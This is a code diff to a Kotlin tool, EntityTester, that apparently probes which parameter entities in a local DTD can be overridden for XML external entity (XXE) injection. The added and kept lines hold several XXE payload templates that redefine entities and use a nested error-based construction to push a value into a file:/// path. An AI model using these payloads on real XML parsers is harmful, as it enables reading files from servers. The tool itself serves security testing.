@@ -8,6 +8,7 @@ import com.sun.org.apache.xerces.internal.xni.parser.XMLEntityResolver
 import com.sun.org.apache.xerces.internal.xni.parser.XMLErrorHandler
 import com.sun.org.apache.xerces.internal.xni.parser.XMLInputSource
 import com.sun.org.apache.xerces.internal.xni.parser.XMLParseException
+import org.w3c.dom.Document
 import org.xml.sax.ErrorHandler
 import org.xml.sax.SAXParseException
 import java.io.*
@@ -20,23 +21,6 @@ class EntityTester {
         val source = SAXInputSource(inputSource)
         val d = XMLDTDLoader()
 
-//    source.inputSourcexmlReader.entityResolver = EntityResolver {
-//        publicId:String, systemId:String ->
-//
-//        println(publicId)
-//        null
-//    }
-
-        d.errorHandler = object: XMLErrorHandler {
-            override fun warning(domain: String?, key: String?, exception: XMLParseException?) {
-            }
-
-            override fun error(domain: String?, key: String?, exception: XMLParseException?) {
-            }
-
-            override fun fatalError(domain: String?, key: String?, exception: XMLParseException?) {
-            }
-        }
 
         d.entityResolver = XMLEntityResolver { resourceIdentifier ->
             //return XMLInputSource(resourceIdentifier);
@@ -48,38 +32,6 @@ class EntityTester {
         }
 
         val g = d.loadGrammar(source) as DTDGrammar
-
-        //g.printElements()
-
-        //Elements
-//    var elementDeclIndex = 0
-//    val elementDecl = XMLElementDecl()
-//    while (g.getElementDecl(elementDeclIndex++, elementDecl)) {
-//
-//        println(elementDecl.name.rawname)
-//        //println(elementDecl.contentModelValidator.toString());
-//    }
-//
-//    //Attributes
-//    var attDeclIndex = 0
-//    val attDecl = XMLAttributeDecl()
-//    while (g.getAttributeDecl(attDeclIndex++, attDecl)) {
-//
-//        println(attDecl.name.rawname)
-//    }
-
-
-
-//            val errorReporter = object: XMLErrorReporter() {
-//            fun reportError(location: XMLLocator?, domain: String?, key: String?, arguments: Array<out Any>?, severity: Short, exception: java.lang.Exception?): String {
-//                if(key == "EntityNotDeclared") {
-//                    println("Entity not declared : "+arguments!!.get(0))
-//                }
-//
-//                return super.reportError(location, domain, key, arguments, severity, exception)
-//            }
-//
-//        }
 
         val entitiesFound = ArrayList<String>()
 
@@ -172,39 +124,9 @@ class EntityTester {
 ]>
 <message></message>
 """
-            //#3 Closing Quotes
-            var payloadElementQuotes = """
-<!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">
 
-    <!ENTITY % $entityName '123)*">
-        <!ENTITY &#x25; file "$magicValue">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        <!ENTITY &#x25; aa "(bb|aa'>
 
-    %local_dtd;
-]>
-<message></message>
-"""
-            payloadElementQuotes = """
-<!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">
-
-    <!ENTITY % $entityName '
-        <!ENTITY &#x25; file "$magicValue">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        <!ENTITY &#x25; aa "(bb|aa'>
-
-    %local_dtd;
-]>
-<message></message>
-"""
-
-            //#4 Open parentheses
+            //#3 Open parentheses
             val payloadElementOpenParentheses = """
 <!DOCTYPE message [
     <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">
@@ -221,7 +143,7 @@ class EntityTester {
 <message></message>
 """
 
-            //#5 Closing parentheses
+            //#4 Closing parentheses
             val payloadElementClosingParentheses = """
 <!DOCTYPE message [
     <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">
@@ -238,7 +160,7 @@ class EntityTester {
 <message></message>
 """
 
-            //#6 Attribute list
+            //#5 Attribute list
             val payloadAttributeList = """
 <!DOCTYPE message [
     <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">
@@ -256,19 +178,20 @@ class EntityTester {
 """
 
             val payloads = arrayOf(payloadInline,
-                    payloadElementSimple,payloadElementOpenParentheses,payloadElementClosingParentheses,payloadElementQuotes,
+                    payloadElementSimple,payloadElementOpenParentheses,payloadElementClosingParentheses,
                     payloadAttributeList)
 
-            //val payloads = arrayOf(payloadElementQuotes)
 
             for (payload in payloads) {
 //                println(" [-] Entity name: $entityName")
 //
                 try {
-                    builder.parse(ByteArrayInputStream(payload.toByteArray(Charsets.UTF_8)))
+                    val doc = builder.parse(ByteArrayInputStream(payload.toByteArray(Charsets.UTF_8)))
 
 
-//                    println("?????")
+//                    println("????? NO ERROR ?????")
+//                    println("XML result: " + doc.getElementsByTagName("message").item(0).textContent)
+
                 } catch (e: FileNotFoundException) {
                     if (e.message!!.contains(magicValue)) {
                         println(" [+] The entity $entity is injectable")
@@ -282,7 +205,8 @@ class EntityTester {
                     }
                 } catch (e: Exception) {
                     //Failed
-//                    println(" [!] $e.message")
+                    //println(" [!] $e.message")
+                    ///e.printStackTrace()
                 }
             }
         }
